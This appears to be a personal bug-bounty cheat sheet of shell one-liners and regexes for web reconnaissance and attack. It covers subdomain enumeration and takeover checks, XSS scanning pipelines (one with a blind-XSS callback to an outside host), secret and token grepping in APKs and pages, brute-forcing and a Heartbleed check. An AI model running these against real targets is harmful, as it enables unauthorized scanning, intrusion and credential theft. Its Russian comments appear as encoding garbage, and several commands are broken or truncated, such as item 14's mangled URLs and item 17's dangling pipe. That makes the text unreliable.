—Å–∫—Ä–∏–ø—Ç—ã –¥–ª—è –ø–æ–∏—Å–∫–∞ –ø–æ —Ä–µ–≥—É–ª—è—Ä–∫–µ

16.Search for urls that have get parameters using waybackurls:  echo "$DOMAIN" | waybackurls | grep -ie "?" > get-urls.txt

46.—Å–≤–æ–π –ø–∞—Ä–∞–º–µ—Ç—Ä –¥–∏—Ä–ª–∏—Å—Ç –¥–ª—è –±—Ä—É—Ç–∞ paramlist() { waybackurls $1 |  grep "?" | unfurl keys  | sort -u | tee -a paramlist.txt }


15.Collect endpoints, subdomains with gospider   gospider -s https://domain.com -d 10 -a -w --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|woff2|svg|js)" | grep -oP "(http[s]?:\/\/)?((-)?[\w+\.]){1,}domain\.com.*"






1.Regex to match JWTs (use it with Burp *wink-wink*)------[= ]eyJ[A-Za-z0-9_\/+-]*\.[A-Za-z0-9._\/+-]*  --  —ç–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏—è –∏ –ø—Ä–æ–≤–µ—Ä–∫–∞ https://github.com/ticarpi/jwt_tool

2.–≥–µ–Ω–µ—Ä–∞—Ü–∏—è —Å–ª–æ–≤–∞—Ä—è —á–µ—Ä–µ–∑ –≤–µ–π–±—ç–∫ –º–∞—à–∏–Ω—É   curl -s ‚Äúhttp://web.archive.org/cdx/search/cdx?url=hackerone.com/*&output=text&fl=original&collapse=urlkey" | sed ‚Äòs/\//\n/g‚Äô | sort -u | grep -v ‚Äòsvg\|.png\|.img\|.ttf\|http:\|:\|.eot\|woff\|ico\|css\|bootstrap\|wordpress\|.jpg\|.jpeg‚Äô > wordlist


3.–∏–º–ø–æ—Ä—Ç –≤—Å–µ—Ö —Å—Å—ã–ª–∫–æ –≤ –±—É—Ä–ø –¥–ª—è —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è cat <file-name> | parallel -j 200 curl -L -o /dev/null {} -x 127.0.0.1:8080 -k -s

4.–ø–æ–∏—Å–∫ –∏–Ω–ø—É—Ç–æ–≤ —á–µ—Ä–µ–∑ –≤–µ–π–±—ç–∫ web.archive.org /cdx/search/cdx?url=*.target.com/*&output=text&fl=original&collapse=urlkey

5.ùêîùê¨ùê¢ùêßùê† "ùê†ùê´ùêûùê©" ùê≠ùê® ùóòùòÖùòÅùóøùóÆùó∞ùòÅ ùó®ùó•ùóü'ùòÄ ùó≥ùóøùóºùó∫ ùó∑ùòÇùóªùó∏ ùó±ùóÆùòÅùóÆ.cat file | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*"*   curl http://host.xx/file.js | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*"*

6.xss_one_liner:-  gospider -S targets_urls.txt -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'| grep "=" | qsreplace -a | dalfox pipe -o result.txt

7.—Å–æ–∑–¥–∞–Ω–∏–µ –∫–∞—Å—Ç–æ–º–Ω–æ–≥–æ –≤–æ—Ä–¥–ª–∏—Å—Ç–∞ –¥–ª—è —Ä–µ–∫–æ–Ω–∞   amass intel -whois -d http://example.com |gau -subs | qsreplace -a |cut -d / -f4- |sort -u |tee wordlist.txt

8.recon profile for subdomaintakeover    Recon() {subfinder -d $1 >> hosts | assetfinder -subs-only $1 >> hosts | amass enum -norecursive -noalts -d $1 >> hosts | subjack -w hosts -t 100 -timeout 30 -ssl -c ~/subjack/fingerprints.json -v 3 >> takeover
}
9.find JWT token  \b(ey[a-z0-9+\-\._]+[=|==|\s|;|"])

10.find email id \b[\w\.\!\$\+\-\/\=\?\_\~]+@[\w]+\.[\w]+\b

11.find subdomains  \b[\w\.\-\\\/%\*]*(\.twitter)\.(com)\b

12.find ip adress  \b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b

13.find internal ip adress \b(192|10|172)\.(\d\d\d|\d\d|\d)\.(\d\d\d|\d\d|\d)\.(\d\d\d|\d\d|\d)\b

14.all IP&email addresses, URLs and domains from all repos by a Github user    url -s hxxps://api.github.com/users/uber/repos?per_page=100 | ruby -rjson -e 'JSON.load(hxxp://STDIN.read).each {|repo| %x[git clone #{repo["clone_url"]} ]}'

–ø—Ä–æ–¥–æ–ª–∂–µ–Ω–∏–µ –∫ 14  (2) Install https://bit.ly/grepaddr and run this Bash script:   for d in *; do
 echo find $d/ -type f -exec cat {} +\|strings\|grepaddr --resolve -decode 2 -unslash 1 -csv $d.csv
 find $d/ -type f -exec cat {} +|strings|grepaddr --resolve -decode 2 -unslash 1 -csv $d.csv
done


17. Turn your list of URLs into a list of paths   awk -F ':80/|:443/|.com/|.net/|.org/|.gov/|.eu/|.co.uk/|.co.jp/|.nl/|.int/|.io/|.mil/|.co/|.info/|.ai/|.xyz/|.es/|.fr/|.de/|.cn/|.top/|.ca/' '{print $2}' | awk -F "/" '{print $1}' | awk -F "?|&|;|%|,|:" '{print $1}' | sed 's/%20/_/g' | sed 's/=*$//g' |

18.Get all target parameters: `gau http://riders.uber.com|grep -Eio '\?\S*'|tr '?' ' '|awk '{print $1}'|tr '&' '\n'|tr '='  ' '|awk '{print $1}'|sort -u`

19.xss oneliner   cat target_list| gau | egrep -o "http?.*" | grep "="| egrep -v ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt|js)" | qsreplace -a | dalfox pipe -blind https://fb06.xss.ht -o result.txt

20. broken link checker    Blc() {
subfinder -d $1 | httprobe | waybackurls | egrep -iv ".(jpg|gif|css|png|woff|pdf|svg|js)" | burl | tee brokenlink.txt
}

21. get altnames from ssl certificate    timeout 3 openssl s_client -showcerts -servername $1 -connect $1:443 <<< "Q"  2>/dev/null | openssl x509 -text -noout | grep DNS | tr ',' '\n' | cut -d ':' -f 2 | sort -fu


22.Nmap oneliner to give you a clean list of host:port:version: #> mkdir nmap; cat targets.txt | parallel -j 35 nmap {} -sTVC -host-timeout 15m -oN nmap/{} -p 22,80,443,8080 --open > /dev/null 2>&1; cd nmap; grep -Hari "/tcp" | tee -a ../services.txt; cd ../


23. —Ä–µ–∫–≤–µ—Å—Ç –∫—É—á–∏ —É—Ä–ª–æ–≤ —á—Ç–æ—Ä–±—ã –ø–æ–º–µ—Å—Ç–∏—Ç—å –∏—Ö –≤ –±—É—Ä–ø –∏–∑ —Ç–µ–∫—Å—Ç–æ–≤–æ–≥–æ —Ñ–∞–π–ª–∞   cat yahoourls.txt| parallel -j 10 curl --proxy http://127.0.0.1:8080 -sk > /dev/null



25. –≤—ã—Ç–∞—â–∏—Ç—å —Ç–æ–ª—å–∫–æ –Ω–∞–∑–≤–∞–Ω–∏—è –ø—É—Ç–µ–π, –Ω–µ –ø–æ–ª–Ω—ã–π –ø—É—Ç—å –∏–∑ unfurl –æ—Ç —Ç–æ–º–Ω–æ–º–Ω–æ–º–∞ - sed 's#/#\n#g'   path.txt | sort -u

26. security tails api –≤—ã—Ç–∞—â–∏—Ç—å —Å–∞–±–¥–æ–º–µ–Ω—ã curl -s --request GET --url https://api.securitytrails.com/v1/domain/DOMAIN/subdomains?apikey=API_KEY | jq '.subdomains[]' | sed 's/\"//g' > test.txt 2> /dev/null && sed "s/$/.DOMAIN/" test.txt | sed 's/ //g' && rm test.txt

27.–ø—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞ heartbleed cat temp.txt| while read line ; do echo "QUIT"|openssl s_client -connect $line:443 2>&1|grep 'server extension "heartbeat" (id=15)' || echo $line: safe; done

28.Find secret urls:    cat /dev/urandom | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*"*

29. –≤—ã—Ç–∞—â–∏—Ç—å —Å–µ–Ω—Å –∏–Ω—Ñ—É –∏–∑ apk (c–Ω–∞—á–ª–∞ –∞–Ω–ø–∞–∫–Ω—É—Ç—å —ç—Ç–∏–º  --apktool d app_name.apk)   grep -EHirn "accesskey|admin|aes|api_key|apikey|checkClientTrusted|crypt|http:|https:|password|pinning|secret|SHA256|SharedPreferences|superuser|token|X509TrustManager|insert into" APKfolder/

30.bruteforce subdomains: cat SecLists/Discovery/DNS/dns-Jhaddix.txt | subgen -d DOMAIN.TLD | zdns A --name-servers 1.1.1.1 --threads 500 | jq -r "select(.data.answers[0].name) | .name"

31.–∫–æ–≥–¥–∞ –æ—Ç—Ä–∞–±–æ—Ç–∞–ª –≤—Å–µ –¥–æ–º–µ–Ω—ã –∏ –Ω–µ–∫–æ—Ç–æ—Ä—ã–µ –Ω–µ –æ—Ç—Ä–µ–∑–æ–ª–≤–∏–ª–∏—Å—å, –ø—Ä–æ–±–≤–∞—Ç—å —Ñ—É–∑–∏—Ç—å –∏—Ö —Å –¥–æ–±–∞–≤–ª–µ–Ω–∏–µ–º —Ö–µ–¥–µ—Ä–∞ —É—ç–µ —Ä–µ–∑–æ–ª–≤–Ω—É—Ç—ã—Ö –¥–æ–º–µ–Ω–æ–≤ --cat ips.txt | httprobe | while read targ; do ffuf -u $targ -w non_resolv_subs.txt -H "Host: FUZZ" ; done

32. to find parameters vulnerable to LFI & Path Traversal & SSRF & Open Redirect:  -- \?.*=(\/\/?\w+|\w+\/|\w+(%3A|:)(\/|%2F)|%2F|[\.\w]+\.\w{2,4}[^\w])

33. –ø–æ–∏—Å–∫ –ø–æ–¥–¥–æ–º–µ–Ω–æ–≤ —á–µ—Ä–µ–∑ dnsmap    dnsmap <sitio> -r goo.txt && cat goo.txt | grep <sitio> > g.txt && xargs -n 1 curl -0 < g.txt | grep -Eio "(ft|htt)p(s)?://[^  \"]*" | sort | uniq > fin.txt

34.–æ—Ç—Å–æ—Ä—Ç–∏—Ä–æ–≤–∞—Ç—å —Ç–æ–ª—å–∫–æ 5 —É—Ä–ª–æ–≤ —Å –ø–∞—Ä–∞–º–µ—Ç—Ä–∞–º–∏  –Ω–∞ –∫–∞–∂–¥—ã–π –µ–Ω–¥–ø–æ–∏–Ω—Ç –¥–ª—è –ø—Ä–æ–≥–æ–Ω–∞ –ø–æ  —Ö—Å—Å –∏—Ç–¥ gau http://domain.com > urls.txt;cat urls.txt | grep "?" | unfurl --unique format %s://%d%p > base.txt; cat base.txt | parallel -j 4 grep {} -m5 urls.txt | tee final.txt

35.–≤—ã—Ç–∞—â–∏—Ç—å –∏–Ω—Ç–µ—Ä–µ—Å–Ω—É—é –∏–Ω—Ñ—É –∏–∑ APK grep -EHirn "accesskey|admin|aes|api_key|apikey|checkClientTrusted|crypt|http:|https:|password|pinning|secret|SHA256|SharedPreferences|superuser|token|X509TrustManager|insert into" APKfolder/   –±–æ–ª—å—à–µ –≤–æ—Ä–¥–ª–∏—Å—Ç—ã(More keywords -
setJavaScriptEnabled, root, JavascriptInterface , MODE_WORLD_READABLE, MODE_WORLD_WRITEABLE, Pinner, checkServerTrusted, api_secret, api/v1, api/v2)


36.–ø–æ–∏—Å–∫ ReDos Vulnerability grep -Pnr "([*+]|{\d+,\d*})\)([*+]|{\d+,\d*})"

37. –≥—Ä–∞–±–∏—Ç ip —Å ASN whois -h http://whois.radb.net  -- '-i origin AS36459' | grep -Eo "([0-9.]+){4}/[0-9]+" | uniq

38.One liner to fetch all URLs in scope of all public programs:   curl -s https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/master/data/hackerone_data.json |jq -r '.[].targets.in_scope[] | select(.asset_type|contains("URL")) | .asset_identifier' |grep -v "*" | sort

39. –Ω–∞—Ö–æ–¥–∏—Ç—å VAR –ø–µ—Ä–µ–º–µ–Ω–Ω—ã–µ –≤ –∫–æ–¥–µ –∏ –ø—Ä–æ–±–æ–≤–∞—Ç—å –∏—Ö –∫–∞–∫ —É—Ä–ª –ø–∞—Ä–∞–º–µ—Ç—Ä—ã   assetfinder example.com |gau|egrep -v '(.css|.png|.jpeg|.jpg|.svg|.gif|.wolf)'|while read url; do vars=$(curl -s $url | grep -Eo "var [a-zA-Z0-9_]+" |sed -e 's,'var','"$url"?',g' -e 's/ //g'|grep -v '.js'|sed 's/.*/&=xss/g');echo -e "\e[1;33m$url\n" "\e[1;32m$vars";done

40.–ø–æ–∏—Å–∫ –∏–Ω—Ç–µ—Ä–µ—Å–Ω—ã—Ö —Å–ª–æ–≤ –≤ –∫–æ–¥–µ - gau target | antiburl | awk '{ print $4 }' | grep -E '(callback=|jsonp=|api_key=|api=|password=|email=|emailto=|token=|username=|csrf_token=|unsubscribe_token=|p=|q=|query=|search=|id=|item=|page_id=|secret=|url=|from_url=|load_url=|file_url=|page_url=|file_name=|page=|folder=|folder_urllogin_url=|img_url=|return_url=|return_to=|next=|redirect=|redirect_to=|logout=|checkout=|checkout_url=|goto=|next_page=|file=|load_file=|cmd=|ip=|ping=|lang=|edit=|LoginId=|size=|signature=|passinfo=)' | qsreplace

41. –¥–æ—Å—Ç–∞–≤–∞—Ç—å —ç–Ω–¥–ø–æ–∏–Ω—Ç—ã –∏–∑ js(–∏—Å—Ç–æ—á–Ω–∏–∫ —Ç–∞–º –µ—â–µ –µ—Å—Ç—å -https://gist.github.com/gwen001/0b15714d964d99c740a7e8998bd483df) -curl -L -k -s https://www.example.com | tac | sed "s#\\\/#\/#g" | egrep -o "src['\"]?\s*[=:]\s*['\"]?[^'\"]+.js[^'\"> ]*" | awk -F '//' '{if(length($2))print "https://"$2}' | sort -fu | xargs -I '%' sh -c "curl -k -s \"%\" | sed \"s/[;}\)>]/\n/g\" | grep -Po \"(['\\\"](https?:)?[/]{1,2}[^'\\\"> ]{5,})|(\.(get|post|ajax|load)\s*\(\s*['\\\"](https?:)?[/]{1,2}[^'\\\"> ]{5,})\"" | awk -F "['\"]" '{print $2}' | sort -fu

42.–ø–æ–∏—Å–∫ –¥–æ–º–µ–Ω–æ–≤ —Å pastbin google-search.py -t "site:http://pastebin.com kword" -b -d -s 0 -e 5 | sed "s/\.com\//\.com\/raw\//" | xargs curl -s | egrep -ho "[a-zA-Z0-9_\.\-]+kword[a-zA-Z0-9_\.\-]+" | sort -fu

43.—Å–æ–∑–¥–∞–Ω–∏–µ –≤–æ—Ä–¥–ª–∏—Å—Ç–∞ –Ω–∞ –æ—Å–Ω–æ–≤–µ –≤–µ–π–±—ç–∫–º–∞—à–∏–Ω—ã echo http://example.com | waybackurls |cut -d '/' -f4- |sort -u |tee wordlist.txt

44.–¥–æ—Å—Ç–∞–µ—Ç —É—Ä–ª —Å –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–º –¥–ª—è 4 —É—Ä–ª–æ–≤ cat sub-domains.txt | hakrawler | grep 'http' | cut -d ' ' -f 2  > crawling.txt && gau -subs http://domain.com >> crawling.txt && waybackurls http://domain.com >> crawling.txt && cat crawling.txt | grep "?" | unfurl --unique format %s://%d%p > base.txt;  cat base.txt | parallel -j 4 grep {} -m5 crawling.txt | tee final1.txt; cat final1.txt | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt|js)" > final.txt && rm -rf base.txt final1.txt

45.c–∫—Ä–∏–ø—Ç –¥–ª—è yahoo —É–¥–∞–ª—è–µ—Ç –∏–∑ —Å–ø–∏—Å–∫–∞ —Å—Ç—Ä–∞–Ω–∏—Ü—ã —Å Will back soon...    cat endpoints.txt | xargs -I{} sh -c 'if curl -s "{}" | grep -q "Will be right back..."; then :; else echo {}; fi' | grep "http" | tee -a results.txt


47.


















29.
